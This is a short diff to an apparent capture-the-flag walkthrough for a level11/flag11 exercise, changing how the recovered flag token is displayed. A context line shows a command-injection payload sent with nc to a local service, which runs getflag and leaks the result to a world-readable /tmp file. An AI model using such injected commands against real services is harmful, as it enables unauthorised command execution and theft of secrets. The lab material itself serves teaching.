@@ -89,7 +89,7 @@ printf 'x; getflag > /tmp/leak; echo\n' | nc -q1 127.0.0.1 5151
 `/tmp/leak` is created by flag11 with default (world-readable) permissions, so `level11` can read it:
 ```bash
 cat /tmp/leak
-# Check flag.Here is your token: ***FLAG11***
+# Check flag.Here is your token : ***FLAG11***
 ```
 The injection already ran `getflag` as flag11, so `***FLAG11***` is the
 **level12 password** directly — no `su flag11` is needed.
@@ -98,7 +98,7 @@ The injection already ran `getflag` as flag11, so `***FLAG11***` is the
 
 ## 5. Flag
 ```text
-Check flag.Here is your token: ***FLAG11***
+***FLAG11***
 ```
 - **Next Level User:** `level12`
 - **Password for next level:** `***FLAG11***`
